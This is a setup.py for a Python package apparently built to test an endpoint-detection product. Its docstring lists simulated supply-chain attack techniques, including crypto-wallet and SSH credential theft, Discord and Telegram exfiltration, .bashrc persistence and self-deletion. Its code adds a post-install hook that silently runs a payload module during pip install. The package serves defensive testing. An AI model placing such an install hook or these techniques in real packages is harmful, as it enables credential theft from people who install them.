"""
probe-alpha — Multi-vector supply chain attack simulation.

!! THIS IS A TEST ARTIFACT FOR KOJUTO EDR VALIDATION !!
!! IT CONTAINS NO REAL MALWARE — ALL C2/EXFIL TARGETS ARE UNREACHABLE !!
!! DO NOT PUBLISH TO PyPI !!

Simulated TTPs:
  - Environment gating (CI / platform detection)
  - Crypto wallet harvesting (Solana, Ethereum, Bitcoin)
  - SSH/cloud credential harvesting
  - Discord webhook exfiltration
  - Telegram Bot API exfiltration
  - Stage-2 payload drop + execution from /tmp
  - Persistence via .bashrc injection
  - Anti-forensics self-deletion
  - IP recon
  - Anti-debugging ptrace check

Detection coverage exercised:
  credential_access  — crypto wallet paths (.solana/, .bitcoin/, .ethereum/)
  data_exfiltration  — Discord/Telegram/ipinfo.io DNS resolution
  c2_communication   — connect to external IP
  code_execution     — python3 -c / /tmp execution
  persistence        — .bashrc write
  evasion            — ptrace(PTRACE_TRACEME)
  dns_tunneling      — high-entropy subdomain exfil
"""

from setuptools import setup
from setuptools.command.install import install
import subprocess
import sys


class PostInstall(install):
    """Simulated postinstall hook — runs the payload during pip install."""

    def run(self):
        install.run(self)
        subprocess.Popen(
            [sys.executable, "-c", "import probe_alpha.payload"],
            env={"PATH": "/usr/bin:/usr/local/bin"},
        )


setup(
    name="probe-alpha",
    version="0.1.0",
    packages=["probe_alpha"],
    cmdclass={"install": PostInstall},
)
